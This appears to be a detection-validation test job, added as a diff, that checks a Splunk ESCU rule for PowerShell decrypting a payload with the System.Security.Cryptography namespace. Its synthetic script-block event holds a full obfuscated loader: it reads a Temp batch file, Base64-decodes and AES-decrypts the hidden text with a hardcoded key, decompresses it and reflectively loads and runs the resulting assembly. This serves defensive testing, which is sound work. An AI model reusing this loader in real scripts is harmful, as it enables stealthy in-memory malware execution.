@@ -1,0 +1,44 @@
+type: job
+name: Windows Powershell Cryptography Namespace
+detection:
+  source: escu
+  name: "ESCU - Windows Powershell Cryptography Namespace - Rule"
+  id: f8b482f4-6d62-49fa-a905-dfa15698317b
+description: |
+  Validates detection of PowerShell decrypting a payload with the
+  System.Security.Cryptography namespace: PowerShell/Operational EID 4104
+  (Script Block Logging) records a block that reads a batch file, takes the
+  Base64 text after a ':: ' line, decrypts it with
+  System.Security.Cryptography.AesManaged in CBC mode with PKCS7 padding,
+  decompresses it with GZipStream and loads it with
+  [System.Reflection.Assembly] Load, invoking its entry point. Method names
+  are written as reversed strings, and PowerShell logged the block at
+  Warning level.
+
+mitre:
+  tactics: [execution]
+  techniques: [T1059.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  level:              3
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      level:             ref.level
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_block_text: "$PPEQX = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\\Users\\Administrator\\AppData\\Local\\Temp\\rmzisb.bat').Split([Environment]::NewLine);foreach ($ISDmE in $PPEQX) { if ($ISDmE.StartsWith(':: ')) { $kfDpT = $ISDmE.Substring(3); break; }; };$qhlsi = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($kfDpT);$sMaNL = New-Object System.Security.Cryptography.AesManaged;$sMaNL.Mode = [System.Security.Cryptography.CipherMode]::CBC;$sMaNL.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$sMaNL.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('fORyY3/kFcJCTB3T7nnYrDmtsAUyW1dufJ7r580FOfQ=');$sMaNL.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('w2NvsEq4CVYgOm4J93NDjA==');$NJjYs = $sMaNL.CreateDecryptor();$qhlsi = $NJjYs.TransformFinalBlock($qhlsi, 0, $qhlsi.Length);$NJjYs.Dispose();$sMaNL.Dispose();$iVBHx = New-Object System.IO.MemoryStream(, $qhlsi);$gYqjQ = New-Object System.IO.MemoryStream;$wZmtk = New-Object System.IO.Compression.GZipStream($iVBHx, [IO.Compression.CompressionMode]::Decompress);$wZmtk.CopyTo($gYqjQ);$wZmtk.Dispose();$iVBHx.Dispose();$gYqjQ.Dispose();$qhlsi = $gYqjQ.ToArray();$FxMTS = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($qhlsi);$ARGvJ = $FxMTS.EntryPoint;$ARGvJ.Invoke($null, (, [string[]] ('')))"
+    expectation:
+      expected: alert
+      summary: "PowerShell AES-decrypts and GZip-decompresses a payload, then loads it"
+      mitre:
+        tactics: [execution]
+        techniques: [T1059.001]
